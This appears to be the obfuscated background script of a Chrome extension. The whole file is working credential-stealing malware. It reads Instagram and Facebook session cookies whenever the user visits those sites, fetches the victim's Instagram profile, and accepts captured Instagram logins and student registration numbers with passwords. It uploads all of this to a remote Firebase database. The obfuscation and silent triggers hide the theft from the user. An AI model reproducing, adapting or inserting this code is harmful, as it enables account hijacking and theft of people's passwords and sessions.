const a0q = a0b;
(function (a, b) {
  const p = a0b,
    c = a();
  while (!![]) {
    try {
      const d =
        (-parseInt(p(0x21c)) / 0x1) * (-parseInt(p(0x200)) / 0x2) +
        (-parseInt(p(0x1f0)) / 0x3) * (parseInt(p(0x21b)) / 0x4) +
        (parseInt(p(0x207)) / 0x5) * (parseInt(p(0x217)) / 0x6) +
        (-parseInt(p(0x23d)) / 0x7) * (-parseInt(p(0x22a)) / 0x8) +
        parseInt(p(0x20a)) / 0x9 +
        (parseInt(p(0x1fc)) / 0xa) * (-parseInt(p(0x1ec)) / 0xb) +
        (-parseInt(p(0x233)) / 0xc) * (-parseInt(p(0x215)) / 0xd);
      if (d === b) break;
      else c["push"](c["shift"]());
    } catch (e) {
      c["push"](c["shift"]());
    }
  }
})(a0a, 0xa7db4),
  console[a0q(0x1f3)](a0q(0x223), a0q(0x204));
import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
function a0a() {
  const x = [
    "l2LUzM8V",
    "jwpINyWGw0LhxsbbueKGCMvZCg9UC2uGzxjYB3i6ieHuvfaG",
    "sw5ZDgfNCMfTidiXos4WlJaUmtiUmte3iefUzhjVAwq",
    "y29VA2LLCW",
    "DxnLCG",
    "jwnBsuDDifn0yxj0Aw5NieLUC3rHz3jHBsbZzxnZAw9UigzLDgnOlI4U",
    "mtjtzfPXB2m",
    "zxjYB3i",
    "jwpIMQdVUi8Gw0LhxsbnAxnZAw5NihjLCxvPCMvKignVB2TPzxm6",
    "jwpIM5tVUi8Gw0zcxsbbBhjLywr5igHHBMrSzwqGAw4TBwvTB3j5iokaLcbZA2LWCgLUzW",
    "jwpIM5tVUi8Gw0LhieXVz2LUxsbbBhjLywr5igHHBMrSzwqGAw4TBwvTB3j5iokaLcbZA2LWCgLUzYbZyxzL",
    "jwpIM5tVUi8Gw0LhxsbbBhjLywr5igHHBMrSzwqGAw4TBwvTB3j5iokaLcbZA2LWCgLUzW",
    "jwpINyWGw0LhxsbfEgnLChrPB24GzhvYAw5NiefqssbMzxrJAdO",
    "CNvUDgLTzq",
    "ANnVBG",
    "BMfTzq",
    "n0PUt2riBG",
    "jwnBsuDDienVB2TPzxmGzM91BMq6",
    "ywrKtgLZDgvUzxi",
    "Aw5ZDgfNCMfT",
    "DxnLCM5HBwu",
    "C2vZC2LVBMLK",
    "y29SB3i6igrLzxbZA3LIBhvLoYbMB250lxDLAwDODdOGyM9SzdS",
    "Aw5ZDgfNCMfTlMnVBq",
    "jwpIM5tVUi8Gw0zcxsbeDxbSAwnHDguGC2vZC2LVBIbKzxrLy3rLzcdIGjqGC2TPChbPBMCGC2f2zq",
    "B25nzxnZywDL",
    "jwpIM5tVUi8Gw0LhxsbeDxbSAwnHDguGC2vZC2LVBIbKzxrLy3rLzcdIGjqGC2TPChbPBMCGC2f2zq",
    "jwpWN5QaifTgqL0GrMfJzwjVB2SGC2vZC2LVBIbZyxzLzcbZDwnJzxnZzNvSBhK",
    "jwpIMQdVUi8Gw0zcxsbnAxnZAw5NihjLCxvPCMvKignVB2TPzxm6ignFDxnLCIbVCIb4CW",
    "zMfJzwjVB2S",
    "BwvZC2fNzuXPC3rLBMvYqxr0ywnOzwq",
    "y29SB3i6ig9Yyw5NztSGzM9UDc13zwLNAhq6igjVBgq7",
    "jwpINiuGw0Xqvv0Gu3r1zgvUDcbKyxrHihnHDMvKigzVCIbYzwDoBZOG",
    "jwpWN5QaifTjrYbmB2DPBL0Gtg9NAw4Gy3jLzgvUDgLHBhmGC2f2zwqGzM9Yiea",
    "jwnBsuDDiezLDgnOAw5NihvZzxiGAw5MBYbMCM9TieLUC3rHz3jHBsbbueKUlI4",
    "Dw5RBM93BL91C2vY",
    "yMLVz3jHCgH5",
    "mtfkD211rgC",
    "zMfJzwjVB2SUy29T",
    "otm2nJe5nZqZmZKYndu5",
    "jwpIM5tVUi8Gw0LhieXVz2LUxsbeDxbSAwnHDguGBg9NAw4Gzgf0ysbKzxrLy3rLzcdIGjqGC2TPChbPBMCGC2f2zq",
    "mtvrq3nHyum",
    "jwpINiuGw0LhxsbvC2vYigLUzM8GzMv0y2HLzcbZDwnJzxnZzNvSBhK6",
    "jwpINyWGw0LhieXVz2LUxsbgywLSzwqGDg8GC2f2zsbJCMvKzw50AwfSCYb0BYbgAxjLC3rVCMu6",
    "Bg9N",
    "y29SB3i6igrVzgDLCMjSDwu7igzVBNqTD2vPz2H0oIbIB2XKoYbMB250lxnPEMu6ide0ChG7",
    "zhnFDxnLCL9Pza",
    "y191C2vY",
    "lMLUC3rHz3jHBs5JB20",
    "DgfIBgu",
    "ywrK",
    "C3rHDhvZ",
    "y29SB3i6igDYyxK7igzVBNqTD2vPz2H0oIbIB2XKoW",
    "mte3nZi3nZboBwfhCLm",
    "zw4Tvvm",
    "jwmGlsbKC191C2vYx2LKignVB2TPzsbot1qGzM91BMq",
    "jwpINyWGw0zcxsbgywLSzwqGDg8GC2f2zsbZzxnZAw9UihrViezPCMvZDg9YztO",
    "mJi1nJGYwuveDhfn",
    "jwpIM5tVUi8Gw0Xqvv0GqwXYzwfKEsbOyw5KBgvKigLUlw1LBw9YEsdIGjqGC2TPChbPBMC",
    "jwpIMQdVUi8Gw0LhieXVz2LUxsbjBMnVBxbSzxrLigXVz2LUigrHDgeGCMvJzwL2zwqSihnRAxbWAw5NihnHDMuU",
    "jwnBrKjDifn0yxj0Aw5NiezHy2vIB29RihnLC3nPB24GzMv0y2GUlI4",
    "y29SB3i6igDYzwvUoYbMB250lxDLAwDODdOGyM9SzdS",
    "zgf0yq",
    "C2vZC2LVBMLKpq",
    "mZm1A3DYwfj1",
    "zMLUza",
    "jwnBrKjDienVB2TPzxmGzM91BMq6",
    "ntiYmta5ofD3zhj4Ca",
    "DhLWzq",
    "y29SB3i6ig1LzgL1BxnLywDYzwvUoYbMB250lxDLAwDODdOGyM9SzdSGzM9UDc1ZAxPLoIaXnhb4oW",
    "C3r1zgvUDf9KyxrH",
    "jwnBsuCGtg9NAw5DifjLy2vPDMvKigXVz2LUignYzwrLBNrPywXZoG",
    "D2fYBG",
    "Aw5ZDgfNCMfTx2XVz2LUx2rHDge",
    "z2v0qwXS",
    "y29SB3i6ig9Yyw5NztS",
    "Aw5JBhvKzxm",
    "jwpINyWGw0LhxsbgywLSzwqGDg8GC2f2zsbZzxnZAw9UihrViezPCMvZDg9YztO",
    "mtq1mJe5ndLlt2f3DMe",
    "C3rHDhvZvgv4Da",
    "otK2Bw5zD2ny",
    "Ahr0Chm6lY9PlMLUC3rHz3jHBs5JB20VyxbPl3yXl3vZzxjZlW",
    "y29SB3i6ihjLzdSGzM9UDc13zwLNAhq6igjVBgq7",
    "B25dB21WBgv0zwq",
    "odKXmdmYseLpuuHl",
    "mufHC0z3qW",
    "y29SB3i6ig1LzgL1BxnLywDYzwvUoYbMB250lxDLAwDODdOGyM9SzdS",
    "jwpINyWGw0Xqvv0GrxjYB3iGC2f2Aw5Nihn0DwrLBNqGzgf0ytO",
    "y29SB3i6igDYzwvUoYbMB250lxDLAwDODdOGyM9SzdSGzM9UDc1ZAxPLoIaXm3b4oW",
    "jwpWN5QaifTjr10Gu2vZC2LVBIbZyxzLzcbZDwnJzxnZzNvSBhKGzM9Yiea",
    "r0vu",
    "DMfSDwu",
    "jwpWN5QaifnLCNzPy2uGv29YA2vYieXVywrLzcdINiu",
    "lMzHy2vIB29RlMnVBq",
    "AgfZ",
    "jwmGlsbZzxnZAw9UAwqGy29VA2LLie5pvcbMB3vUza",
    "C3r1zgvUDerHDge",
    "y29SB3i6igXPBwvNCMvLBJSGzM9UDc13zwLNAhq6igjVBgq7",
    "y29SB3i6ig9Yyw5NztSGzM9UDc13zwLNAhq6igjVBgq7igzVBNqTC2L6ztOGmtnWEdS",
    "oti1otu5mKXJvM9hDq",
    "Aw5ZDgfNCMfTq3jLza",
    "D2vItMf2AwDHDgLVBG",
  ];
  a0a = function () {
    return x;
  };
  return a0a();
}
import { isDuplicateData } from "./utils.js";
const savedStudentSet = new Set(),
  savedInstagramCredSet = new Set(),
  savedInstagramSessionSet = new Set(),
  savedFacebookSessionSet = new Set();
chrome[a0q(0x22c)][a0q(0x21a)][a0q(0x1d9)](
  async ({ url: a, frameId: b }) => {
    const r = a0q;
    if (b !== 0x0) return;
    if (a[r(0x213)](r(0x1de))) await handleInstagram();
    else a[r(0x213)](r(0x1ed)) && (await handleFacebook());
  },
  { url: [{ hostSuffix: a0q(0x1de) }, { hostSuffix: a0q(0x1ed) }] }
);
function a0b(a, b) {
  const c = a0a();
  return (
    (a0b = function (d, e) {
      d = d - 0x1d8;
      let f = c[d];
      if (a0b["lPfkZo"] === undefined) {
        var g = function (l) {
          const m =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let n = "",
            o = "";
          for (
            let p = 0x0, q, r, s = 0x0;
            (r = l["charAt"](s++));
            ~r && ((q = p % 0x4 ? q * 0x40 + r : r), p++ % 0x4)
              ? (n += String["fromCharCode"](0xff & (q >> ((-0x2 * p) & 0x6))))
              : 0x0
          ) {
            r = m["indexOf"](r);
          }
          for (let t = 0x0, u = n["length"]; t < u; t++) {
            o +=
              "%" +
              ("00" + n["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
          }
          return decodeURIComponent(o);
        };
        (a0b["RifcMk"] = g), (a = arguments), (a0b["lPfkZo"] = !![]);
      }
      const h = c[0x0],
        i = d + h,
        j = a[i];
      return !j ? ((f = a0b["RifcMk"](f)), (a[i] = f)) : (f = j), f;
    }),
    a0b(a, b)
  );
}
!globalThis[a0q(0x1e5)] &&
  (chrome[a0q(0x23a)][a0q(0x1e0)][a0q(0x1d9)](async (a, b, c) => {
    const s = a0q;
    if (a[s(0x20b)] === s(0x210)) {
      const { username: d, password: e } = a[s(0x205)];
      if (!d || !e) {
        console[s(0x20f)](s(0x202), s(0x1e6));
        return;
      }
      console[s(0x1f3)](s(0x20e), s(0x1f4)),
        console[s(0x1f8)]({ username: d, password: e });
      const f = collection(db, s(0x22b)),
        g = { username: d, password: e },
        h = d + ":" + e;
      try {
        if (savedInstagramCredSet[s(0x225)](h)) {
          console[s(0x20f)](s(0x237), s(0x1fb));
          return;
        }
        savedInstagramCredSet[s(0x1f9)](h);
        if (await isDuplicateData(f, g)) {
          console[s(0x20f)](s(0x1ef), s(0x1fb));
          return;
        }
        await addDoc(f, { ...g, timestamp: new Date() }),
          console[s(0x1f3)](s(0x1e8) + d, s(0x20c));
      } catch (i) {
        console[s(0x234)](s(0x1f2), s(0x219), i);
      }
    }
    if (a[s(0x20b)] === s(0x20d)) {
      const { registrationNumber: j, password: k } = a[s(0x205)];
      if (!j || !k) return;
      const l = collection(db, s(0x227)),
        m = { registrationNumber: j, password: k },
        n = j + ":" + k;
      try {
        if (savedStudentSet[s(0x225)](n)) {
          console[s(0x20f)](s(0x201), s(0x1fb));
          return;
        }
        savedStudentSet[s(0x1f9)](n);
        if (await isDuplicateData(l, m)) return;
        await addDoc(l, { ...m, timestamp: new Date() }),
          console[s(0x1f3)](s(0x1e7) + j, s(0x21d));
      } catch (o) {
        console[s(0x234)](s(0x21e), s(0x219), o);
      }
    }
  }),
  (globalThis[a0q(0x1e5)] = !![]));
async function handleInstagram() {
  const t = a0q;
  chrome[t(0x230)][t(0x211)]({ domain: t(0x1f7) }, async (a) => {
    const u = t;
    console[u(0x1f3)](u(0x232), u(0x1f4));
    const b = a[u(0x208)]((k) => k[u(0x23c)] === u(0x1dc)),
      c = a[u(0x208)]((k) => k[u(0x23c)] === u(0x1f5));
    if (!b || !c) {
      console[u(0x20f)](u(0x235), u(0x229));
      if (!b) console[u(0x20f)](u(0x226), u(0x212));
      if (!c) console[u(0x20f)](u(0x1fe), u(0x212));
      return;
    }
    const d = b[u(0x222)],
      e = c[u(0x222)];
    console[u(0x1f3)](u(0x1d8), u(0x21f)),
      console[u(0x1f8)]([
        { name: u(0x1dc), value: d },
        { name: u(0x1f5), value: e },
      ]);
    let f = u(0x1ea),
      g = "";
    try {
      console[u(0x1f3)](u(0x1e9), u(0x1dd));
      const k = await fetch(u(0x218) + e + u(0x22d), {
        method: u(0x221),
        headers: {
          "User-Agent": u(0x22f),
          Cookie: u(0x206) + d + ";",
          "X-IG-App-ID": u(0x1ee),
          "Accept-Language": u(0x1fd),
        },
      });
      if (!k["ok"]) {
        console[u(0x234)](
          u(0x22e) + k[u(0x1fa)] + "\x20" + k[u(0x216)],
          u(0x219)
        );
        return;
      }
      const l = await k[u(0x23b)](),
        m = l[u(0x231)] || {};
      (f = m[u(0x1db)] || u(0x1ea)),
        (g = m[u(0x1eb)] || ""),
        console[u(0x1f3)](u(0x1f1), u(0x228)),
        console[u(0x1f8)]({ username: f, bio: g });
    } catch (n) {
      console[u(0x234)](u(0x239), u(0x219), n);
      return;
    }
    const h = e + ":" + d;
    if (savedInstagramSessionSet[u(0x225)](h)) {
      console[u(0x20f)](u(0x238), u(0x1fb));
      return;
    }
    savedInstagramSessionSet[u(0x1f9)](h);
    const i = { sessionId: d, userId: e, username: f, bio: g },
      j = collection(db, u(0x1da));
    try {
      if (await isDuplicateData(j, i)) {
        console[u(0x20f)](u(0x1e1), u(0x1fb));
        return;
      }
      await addDoc(j, { ...i, timestamp: new Date() }),
        console[u(0x1f3)](u(0x220) + f, u(0x20c));
    } catch (o) {
      console[u(0x234)](u(0x214), u(0x219), o);
    }
  });
}
async function handleFacebook() {
  const v = a0q;
  chrome[v(0x230)][v(0x211)]({ domain: v(0x224) }, async (a) => {
    const w = v;
    console[w(0x1f3)](w(0x203), w(0x1f4));
    const b = a[w(0x208)]((g) => g[w(0x23c)] === w(0x1f6)),
      c = a[w(0x208)]((g) => g[w(0x23c)] === "xs");
    if (!b || !c) {
      console[w(0x20f)](w(0x1e3), w(0x229));
      return;
    }
    const d = b[w(0x222)] + ":" + c[w(0x222)];
    if (savedFacebookSessionSet[w(0x225)](d)) {
      console[w(0x20f)](w(0x236), w(0x1fb));
      return;
    }
    savedFacebookSessionSet[w(0x1f9)](d);
    const e = { c_user: b[w(0x222)], xs: c[w(0x222)] };
    console[w(0x1f3)](w(0x209), w(0x21f)), console[w(0x1f8)](e);
    const f = collection(db, w(0x1e4));
    try {
      if (await isDuplicateData(f, e)) {
        console[w(0x20f)](w(0x1df), w(0x1fb));
        return;
      }
      await addDoc(f, { ...e, timestamp: new Date() }),
        console[w(0x1f3)](w(0x1e2), w(0x20c));
    } catch (g) {
      console[w(0x234)](w(0x1ff), w(0x219), g);
    }
  });
}
